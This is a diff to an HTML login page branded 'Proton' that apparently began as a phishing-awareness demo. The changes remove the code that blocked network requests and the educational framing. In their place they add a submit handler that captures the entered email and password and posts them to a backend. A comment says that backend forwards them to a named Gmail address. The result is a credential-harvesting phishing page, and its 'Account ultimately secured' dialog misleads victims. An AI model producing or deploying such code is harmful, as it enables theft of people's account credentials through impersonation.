@@ -1,4 +1,4 @@
-<!doctype html>
+Proton
 <html lang="en">
 <head>
   <meta charset="utf-8" />
@@ -45,26 +45,30 @@
   <div class="dialog" id="dialog">
     <div class="card">
       <h2>Great news — Account ultimately secured.</h2>
-      <p>Sucessfull:</p>
+      <p>Successful:</p>
       <ul class="list">
-       
         <li><strong>Look for mismatched branding or urgency/bait language.</strong></li>
         <li><strong>Hover links</strong> to preview where they actually go.</li>
         <li><strong>Never reuse passwords</strong> across services; enable 2FA.</li>
       </ul>
-      </p>
       <button onclick="document.getElementById('dialog').style.display='none'">Close</button>
     </div>
   </div>
 
   <script>
     const form = document.getElementById('loginForm');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault(); // prevent any network request
-      // Immediately clear fields so nothing remains in memory
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      // Send credentials to backend mail (hugheskira294@gmail.com)
+      await fetch('http://localhost:3000/send-login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email, password})
+      });
       document.getElementById('email').value = '';
       document.getElementById('password').value = '';
-      // Show educational debrief
       document.getElementById('dialog').style.display = 'flex';
     });
   </script>
